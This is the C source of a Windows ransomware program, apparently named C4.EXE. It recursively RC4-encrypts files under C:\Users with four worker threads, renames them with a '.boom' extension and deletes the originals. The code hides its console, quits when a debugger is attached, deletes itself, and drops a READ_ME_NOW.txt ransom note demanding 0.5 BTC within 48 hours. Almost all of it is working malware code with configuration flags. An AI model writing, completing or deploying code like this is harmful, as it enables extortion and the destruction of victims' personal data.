#include <Windows.h>
#include <process.h>
#include <stdio.h>
#include "memoryutils.h"
#include "stringutils.h"
#include "antianalysis.h"
#include "arcfour.h"
#pragma warning(disable : 4996 4325 4715)
#define MAX_THREADS                 4
#define NUM_BLACKLISTED_EXTENSIONS  11
#define ENCRYPT_EXT_A               ".boom"
#define ENCRYPT_EXT_W               L".boom"
#define SIGNATURE                   0x4d4f4f42  // 'BOOM' 
#define KEY_SIZE                    32
#define HINT_BYTE                   0xB4

#define PRINTA(STR, ... ) do {                                                              \
    LPSTR buf = (LPSTR)_malloc(1024);                                                       \
    if ( buf != NULL ) {                                                                    \
        int len = _wsprintfA(buf, STR, __VA_ARGS__);                                        \
        WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buf, len, NULL, NULL);               \
        _free(buf);                                                                         \
    }                                                                                       \
} while (0)                                                                                 \

#define PRINTW(STR, ... ) do {                                                              \
    LPWSTR buf = (LPWSTR)_malloc(1024);                                                     \
    if ( buf != NULL ) {                                                                    \
        int len = _wsprintfW(buf, STR, __VA_ARGS__);                                        \
        WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), buf, len, NULL, NULL);               \
        _free(buf);                                                                         \
    }                                                                                       \
} while (0)                                                                                 \

void __chkstk(void) {
    // do nothing (not needed for small stack frames)
}

#pragma section(".text", read, execute)
__declspec(allocate(".text")) BOOL g_EncryptMode = TRUE;    // TRUE = Encrypt, FALSE = Decrypt
__declspec(allocate(".text")) BOOL g_RansomMode  = TRUE;    // TRUE = Drop a text file (g_Note) with payment instructions to the current directory
__declspec(allocate(".text")) BOOL g_HideConsole = TRUE;    // TRUE = Hides the console
__declspec(allocate(".text")) BOOL g_AntiDebug   = TRUE;    // TRUE = Program exits when debugger (such as x64dbg, OllyDbg, WinDbg) is attached 
__declspec(allocate(".text")) BOOL g_SelfDelete  = TRUE;    // TRUE = Binary will self-delete
__declspec(allocate(".text")) BOOL g_Verbose     = FALSE;   // TRUE = Print files, directories, errors, and execution time to the console

__declspec(allocate(".text")) LPCWSTR g_Directories[] = { 
    L"C:\\Users",                                           // Directories to encrypt/decrypt
    NULL                                                    // Leave final directory as NULL (do not change)
}; 

__declspec(allocate(".text")) const char* g_Note =
    "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
    "This is not a joke. Want your data restored?\r\n"
    "Send 0.5 BTC to the address below:\r\n"
    "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"
    "You have 48 hours.\r\n";


__declspec(allocate(".text")) unsigned char g_ProtectedKey[] = {
    0xD5, 0xC8, 0x40, 0x72, 0xD3, 0x56, 0xE3, 0x34, 0x27, 0x95, 0x06, 0xB2, 0xDA, 0x21, 0x9E, 0x78,
    0x24, 0x72, 0xD2, 0x96, 0x5F, 0x8F, 0x2F, 0x7D, 0x0A, 0x73, 0x00, 0x87, 0xE0, 0x90, 0x87, 0x18
};

LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {
    ENCRYPT_EXT_W,
    L".exe", L".dll", L".sys", L".ini", L".conf",
    L".cfg", L".reg", L".dat", L".bat", L".cmd"
};

PBYTE   g_RealKey = NULL;
DWORD   g_StartTime,
        g_FinishTime;

typedef struct _THREAD_PARAMS {
    char path[MAX_PATH];
    BOOL encrypt;
} THREAD_PARAMS, * PTHREAD_PARAMS;

typedef struct _ENCRYPTED_FILE_HEADER {
    DWORD Signature;
    BYTE  Rc4Key[KEY_SIZE];
} ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;

BYTE BruteForceProtectedKey(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {
    
    BYTE            b        = 0;
    INT             i        = 0;
    PBYTE           pRealKey = (PBYTE)_malloc(sKey);

    if (!pRealKey)
        return -1;

    while (1) {
        if (((pProtectedKey[0] ^ b)) == HintByte)
            break;
        else
            b++;
    }
    for (int i = 0; i < sKey; i++) {
        pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
    }
    *ppRealKey = pRealKey;
    return b;
}

LPCWSTR GetFileExtensionW(LPCWSTR filePath) { 
    
    LPCWSTR dot = _wcsrchr(filePath, L'.');
    return (dot && *dot) ? dot : NULL;
}

BOOL IsBlacklistedExtension(LPCWSTR filePath) {   
    
    LPCWSTR ext = GetFileExtensionW(filePath);
    
    if (!ext) return FALSE;

    for (int i = 0; i < NUM_BLACKLISTED_EXTENSIONS; i++) {
        if (_wcsicmp_(ext, g_BlacklistedExtensions[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

void EncryptSingleFile(const char* path) {

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    LARGE_INTEGER fsize;
    if (!GetFileSizeEx(hFile, &fsize) || fsize.QuadPart == 0 || fsize.QuadPart > MAXDWORD) {
        CloseHandle(hFile);
        return;
    }

    DWORD size = (DWORD)fsize.QuadPart;
    BYTE* buffer = (BYTE*)_malloc(size);
    if (!buffer) {
        CloseHandle(hFile);
        return;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        CloseHandle(hFile);
        _free(buffer);
        return;
    }
    CloseHandle(hFile);

    RC4_CTX ctx;
    KSA(&ctx, g_RealKey, KEY_SIZE);
    PRGA(&ctx, buffer, size);

    ENCRYPTED_FILE_HEADER hdr = { 0 };
    hdr.Signature = SIGNATURE;
    _memcpy(hdr.Rc4Key, g_RealKey, KEY_SIZE);

    char outPath[MAX_PATH];
    _snprintf_(outPath, MAX_PATH, "%s", path);
    _strncat(outPath, ENCRYPT_EXT_A, MAX_PATH - _strlen(outPath) - 1);

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        _free(buffer);
        return;
    }

    DWORD written = 0;
    WriteFile(hOut, &hdr, sizeof(hdr), &written, NULL);
    WriteFile(hOut, buffer, size, &written, NULL);
    CloseHandle(hOut);

    DeleteFileA(path);
    _free(buffer);
    if (g_Verbose)
        PRINTA("[+] Encrypted: %s -> %s\n", path, outPath);
}

void DecryptSingleFile(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTA("[!] Failed to open file for reading: %s\n", path);
        return;
    }

    ENCRYPTED_FILE_HEADER hdr = { 0 };
    DWORD read = 0;
    if (!ReadFile(hFile, &hdr, sizeof(hdr), &read, NULL) || read != sizeof(hdr)) {
        if (g_Verbose)
            PRINTA("[!] Failed to read header from file: %s\n", path);
        CloseHandle(hFile);
        return;
    }

    if (hdr.Signature != SIGNATURE) {
        if (g_Verbose)
            PRINTA("[!] Invalid signature, skipping file: %s\n", path);
        CloseHandle(hFile);
        return;
    }

    LARGE_INTEGER totalSize;
    if (!GetFileSizeEx(hFile, &totalSize)) {
        CloseHandle(hFile);
        return;
    }

    DWORD encSize = (DWORD)(totalSize.QuadPart - sizeof(hdr));
    BYTE* buffer = (BYTE*)_malloc(encSize);
    if (!buffer) {
        if (g_Verbose)
            PRINTA("[!] Memory allocation failed\n");
        CloseHandle(hFile);
        return;
    }

    SetFilePointer(hFile, sizeof(hdr), NULL, FILE_BEGIN);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, encSize, &bytesRead, NULL) || bytesRead != encSize) {
        if (g_Verbose)
            PRINTA("[!] Failed to read encrypted content\n");
        CloseHandle(hFile);
        _free(buffer);
        return;
    }
    CloseHandle(hFile);

    // Decrypt
    RC4_CTX ctx;
    KSA(&ctx, hdr.Rc4Key, KEY_SIZE);
    PRGA(&ctx, buffer, encSize);

    // Derive output path (strip extension)
    size_t extLen = _strlen(ENCRYPT_EXT_A);
    size_t pathLen = _strlen(path);
    if (pathLen <= extLen || _strcmp(path + pathLen - extLen, ENCRYPT_EXT_A) != 0) {
        if (g_Verbose)
            PRINTA("[!] Unexpected file extension: %s\n", path);
        _free(buffer);
        return;
    }

    char outPath[MAX_PATH];
    _strncpy(outPath, path, pathLen - extLen);
    outPath[pathLen - extLen] = '\0';

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTA("[!] Failed to open file for writing: %s\n", outPath);
        _free(buffer);
        return;
    }

    DWORD bytesWritten = 0;
    WriteFile(hOut, buffer, encSize, &bytesWritten, NULL);
    CloseHandle(hOut);

    DeleteFileA(path);
    _free(buffer);
    if (g_Verbose)
        PRINTA("[+] Decrypted: %s -> %s\n", path, outPath);
}

// Thread entry point for processing a single file
unsigned __stdcall FileWorkerThread(void* pArgs) {    
    
    THREAD_PARAMS* params = (THREAD_PARAMS*)pArgs;

    if (params->encrypt) {
        EncryptSingleFile(params->path);
    }
    else {
        DecryptSingleFile(params->path);
    }
    _free(pArgs);
    return 0;
}

// Multithreaded directory walker, dispatches encrypt/decrypt jobs to threads
BOOL ProcessDirectoryMT(LPCWSTR dir, BOOL encryptMode) {                     
            
            BOOL                result = FALSE;           
            WCHAR               dirPathW[MAX_PATH * 2],
                                fullPathW[MAX_PATH * 2];
            CHAR                fullPathA[MAX_PATH * 2];
            HANDLE              hThreads[MAX_THREADS];           
            INT                 threadCount = 0;
            WIN32_FIND_DATAW    fd = { 0 };
    
    _wsprintfW(dirPathW, L"%s\\*", dir);
    HANDLE hFind = FindFirstFileW(dirPathW, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTW(L"[!] FindFirstFileW failed for %ls\n", dir);
        return result;
    }

    // Step 1: Encrypt/decrypt all files
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
      
        _wsprintfW(fullPathW, L"%s\\%s", dir, fd.cFileName);
        if (!WCharStringToCharString(fullPathA, fullPathW, MAX_PATH * 2)) {
            if (g_Verbose)
                PRINTA("[!] WCharStringToCharString failed!");
            continue;
        }

        BOOL isEncrypted = (_StrStrIW(fd.cFileName, ENCRYPT_EXT_W) != NULL);
        if ((encryptMode && isEncrypted) || (!encryptMode && !isEncrypted)) {
            continue;
        }

        if (encryptMode && IsBlacklistedExtension(fd.cFileName)) {
            if (g_Verbose)
                PRINTW(L"[!] Skipping blacklisted: %s\n", fd.cFileName);
            continue;
        }

        THREAD_PARAMS* pParams = (THREAD_PARAMS*)_malloc(sizeof(THREAD_PARAMS));
        if (!pParams) {
            if (g_Verbose)
                PRINTA("[!] malloc failed for THREAD_PARAMS\n");
            continue;
        }

        _strcpy_s(pParams->path, MAX_PATH, fullPathA);
        pParams->encrypt = encryptMode;

        HANDLE hThread = (HANDLE)CreateThread(NULL, 0, FileWorkerThread, pParams, 0, NULL);
        if (!hThread) {
            if (g_Verbose)
                PRINTA("[!] Failed to create thread for %s\n", pParams->path);
            _free(pParams);
            continue;
        }
       
        hThreads[threadCount++] = hThread;

        if (threadCount == MAX_THREADS) {
            WaitForMultipleObjects(threadCount, hThreads, TRUE, INFINITE);
            for (int i = 0; i < threadCount; i++)
                CloseHandle(hThreads[i]);
            threadCount = 0;
        }
        result = TRUE;

    } while (FindNextFileW(hFind, &fd));

    // Wait for any remaining threads
    if (threadCount > 0) {
        WaitForMultipleObjects(threadCount, hThreads, TRUE, INFINITE);
        for (int i = 0; i < threadCount; i++)
            CloseHandle(hThreads[i]);
    }

    // Step 2: Second pass for recursion into subdirectories
    FindClose(hFind);
    _wsprintfW(dirPathW, L"%s\\*", dir);
    hFind = FindFirstFileW(dirPathW, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return result;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            _wcscmp(fd.cFileName, L".") != 0 &&
            _wcscmp(fd.cFileName, L"..") != 0) {

            WCHAR subDir[MAX_PATH * 2];
            _wsprintfW(subDir, L"%s\\%s", dir, fd.cFileName);

            // Recursive call
            if (ProcessDirectoryMT(subDir, encryptMode)) {
                result = TRUE;
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return result;
}

BOOL WriteTextFile(const char* note) {
    
        WCHAR   wCurrentDir[MAX_PATH];
        DWORD   dwSize = GetCurrentDirectoryW(MAX_PATH, wCurrentDir);

    _wcscat(wCurrentDir, L"\\READ_ME_NOW.txt");

    if (dwSize == 0 || dwSize > MAX_PATH) {
        if (g_Verbose)
            PRINTA("[!] Failed to get current directory.\n");
        return FALSE;
    }
    
    HANDLE hFile = CreateFileW(wCurrentDir, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINTA("[!] Unable to leave note.");
        return FALSE;
    }
    DWORD written = 0;
    WriteFile(hFile, note, (DWORD)_strlen(note), &written, NULL);
    CloseHandle(hFile);
}

// Walks multiple directories and processes files
BOOL Run(LPCWSTR* dirs, BOOL isEncrypting) {
    for (int i = 0; dirs[i] != NULL; i++) {
        if (g_Verbose)
            PRINTW(L"\n[>] Target Directory: %s\n", dirs[i]);
        if (!ProcessDirectoryMT(dirs[i], isEncrypting)) {
            if (g_Verbose)
                PRINTA("[!] Failed to process directory!\n");
        }
    }
    return TRUE;
}

int main() {

    if (g_HideConsole)
        HideConsoleWindow();

    if (g_AntiDebug && IsBeingDebugged()) {;
        return -1;
    }

    BruteForceProtectedKey(HINT_BYTE, g_ProtectedKey, sizeof(g_ProtectedKey), &g_RealKey);
  
    if (g_Verbose)
        g_StartTime = (DWORD)GetTickCount64();
    
    if (Run(g_Directories, g_EncryptMode)) 
        PRINTA("[>] Operation completed successfully.\n");
    else
        PRINTA("[!] No directories processed.\n");

    if (g_Verbose) {
        g_FinishTime = (DWORD)GetTickCount64() - g_StartTime;
        PRINTA("[>] Time: %llu ms\n", g_FinishTime);
    }

    if (g_EncryptMode && g_RansomMode)
        WriteTextFile(g_Note);

    if (g_SelfDelete)
        if (!DeleteSelf())
            if (g_Verbose)
                PRINTA("[!] Self delete failed! %d\n", GetLastError());

    return 0;
}
